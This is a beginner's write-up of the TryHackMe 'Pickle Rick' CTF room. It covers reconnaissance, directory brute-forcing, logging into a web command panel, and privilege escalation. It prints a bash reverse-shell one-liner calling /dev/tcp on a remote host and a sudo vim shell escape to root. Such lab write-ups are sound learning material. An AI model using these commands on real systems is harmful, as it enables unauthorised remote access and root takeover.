# TryHackMe-PickleRick-CTF
This is a simple, fun, and beginner CTF. This is the first CTF room that I have completed on TryHackMe. It involves finding three secret ingredients to help Rick turn back into a human after turning himself into a pickle.

Here, I will highlight a quick walkthrough/step-by-step instruction for how I completed the room. Here on the README, I won't include exact commands I used in order to find the ingredients, but I will include hints to help (if you want the exact lines I used, I will create a cheatsheet with more step-by-step). As I stated before, this was my first room that I completed, so I had the help of some peers to help guide me through the processes. I did go a little overkill in this room as I tried to escalate privileges which was completely unecessary. Now, I will go forward with a walkthorugh as well as screenshots with how things should look. Finally, like I stated before, this is just what I did personally to complete the room.Good luck! 

![picklerick](https://user-images.githubusercontent.com/117850176/201009495-589059c2-e925-43ba-9269-6907607139e3.png)






<img width="556" alt="Screen Shot 2022-11-09 at 10 41 16 PM" src="https://user-images.githubusercontent.com/117850176/201009776-cfc2b1ff-b671-412a-9027-1132ca9c1bb2.png">

The first step to completing this machine is turning on the machine itself, this can be done by selecting task 1 and then pressing the green start machine button. Give this a minute and your personal IP will show up under the "active machine" heading - Keep this IP handy as you will be using this extremely frequently throughout the CTF.


Firstly, I wanted to see what the site would look like. To do this, I just entered the given IP on a firefox (or any other web browswer of your choice) into the search bar. Then a Rick and Morty themed site appeared.

(Put SS of site)

The first step that I took was to use a nmap scan with the given IP on the tryhackme. To do this, I started a command window in kali. Once the window was opened I used the nmap command and found that ports 22 and 80 were both running. 

(Put ss of nmap being used and port 22 and 80 running)

After seeing this, another one of the first steps that I did was to inspect the sites source code to see if I was able to find any hints that were left within the source code. Within the source code, there is a commented section of code that gave a username, keep this username in mind as this is essential information. I won't be giving the username here, so explore the source code and it should make itself apparent to you. 

Upon finding this username, this gave me the insight to attempt to find a password, because usernames and passwords go hand in hand. I then used the dirb command, here it is:
- dirb command
Dirb command is a web content scanner. It looks for existing or hidden web objects, making it a brute force strategy. After using this command I found a list of different directories. The directories that I found will be included in a screenshot below. I won't list eh direct dirb command that I used here but it will be located in the cheat sheet. I browsed each directory found on the website by using /(directory name). After exploring these different directories and I found a password, again this password will be located in the cheatsheet. 

Within the directories given, I was also directed to a login page. If you explore the directories given, you should find this releatively easily. Using the credentials we found in the earlier steps, you should be able to enter the login page. After logging in, you will be presented with a command line. 

(Put ss of login page, command line)

After seeing that a command line was given, I decided to host a netcat listener on my local kali machine on port 1234. I used this port because I knew nothing would be communicating on it. The exact command that I used will be provided via the chaeatsheet.11 Netcat is a command for reading and writing data between two computers. Next, I used a bash reverse shell command that I found on gtfobins, since I found this on a third party site, I will provide the command here. 
- bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'

After successfully running the reverse bash, I was given a shell through the Picklerick site, giving me access. 

Once I had the reverse shell running on my local kali machine, I just used a simple ls command to see what folders existed. I seen that there was a text file that may contain an ingredient. I then used another simple cat command to see the contents of this file. This gave me the first ingredient needed to answer. 

When I did the ls command there were other folders that I could explore. I decided to explore the home folder. To do this, I had to first change the directory. This can be done by using cd home. Once in the home folder, I once again used the ls command to see the contents of the home folder/directory. I seen a folder named rick and ubuntu. The rick folder seemed more appealing to me so Is into this folder. In the rick folder, there was a file straight up title second ingredient. Using the cat command once again, the second ingredient was found. 

Next, I wanted to gain root acess to the shell. I decided to use sudo -l and found that no password was needed and I could run any command. I then used another shell command found on gtfobins. This is it:
- sudo -u root vim -c ':!/bin/sh'
Using this command gave me root access. Once again, I did a ls command and seen a file called 3rd. I used the cat command one last time and this gave me the third and final ingredient. 

All in all, the steps seem very repetetive in this CTF. I had a great time completing this for my first one. I am looking forward to completing more and seeing what other tools I am able to use. 

The answers for this for will be located on the cheatsheet, but I HIGHLY reccomended just using trial and error. As you will learn a lot more and have a more fun time. 

Thank you for reading my write up! I want to document most of, if not, all of my CTFs so that I may keep a journal and others can also view it. Personally for me it was hard to get started at first. But having people help me along the way was so beneficial, so if I can be that for someone else that would be awesome. Anyway, goodluck on any CTFs you look to tackle and happy hacking!
